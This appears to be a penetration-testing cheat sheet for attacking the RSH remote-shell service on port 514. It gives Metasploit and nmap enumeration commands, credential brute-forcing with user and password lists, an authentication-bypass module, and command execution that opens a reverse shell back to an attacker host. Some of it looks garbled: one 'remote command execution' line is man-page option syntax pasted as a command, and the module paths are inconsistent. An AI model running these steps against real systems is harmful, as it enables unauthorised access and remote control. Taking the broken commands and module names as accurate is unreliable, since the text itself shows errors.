# RSH

## Enumeration

### Metasploit

##### rsh_version
```bash
use auxiliary/scanner/rsh/rsh_version
set RHOSTS [IP]
set RPORT 514
run
```

##### rsh_login
```bash
use auxiliary/scanner/rservices/rsh_login
set RHOSTS [IP]
set RPORT 514
set USER_FILE [userlist.txt]
set PASS_FILE [passwordlist.txt]
run
```
### Nmap

##### nmap (RSH service detection)
```bash
nmap -p 514 --script=rsh-info [IP]
```

##### nmap (RSH enumeration)
```bash
nmap -p 514 --script=rsh-enum [IP]
```

### rsh

##### rsh (Connect to RSH)
```bash
rsh [IP] -l [USER]
```

##### rsh (Verbose connection attempt)
```bash
rsh -v [IP] -l [USER]
```

##### Remote Command Execution
```bash
rsh host -l [USER] -n -d -k [REALM] -f | -F -x -PN | -PO [CMD]
```

### rusers

##### Show Logged on Users
```bash
rusers -al [IP]
```


---
---


## Exploitation

### Metasploit

##### rsh_auth_bypass
```bash
use exploit/unix/rsh/rsh_auth_bypass
set RHOSTS [IP]
set RPORT 514
set USERNAME [username]
set PASSWORD [password]
run
```

##### rsh_command_exec
```bash
use exploit/unix/rsh/rsh_command_exec
set RHOSTS [IP]
set RPORT 514
set USERNAME [username]
set PASSWORD [password]
set PAYLOAD unix/reverse
set LHOST [IP]
set LPORT [port]
run
```

##### rsh_brute
```bash
use auxiliary/scanner/rsh/rsh_brute
set RHOSTS [IP]
set RPORT 514
set USER_FILE [userlist.txt]
set PASS_FILE [passwordlist.txt]
run
```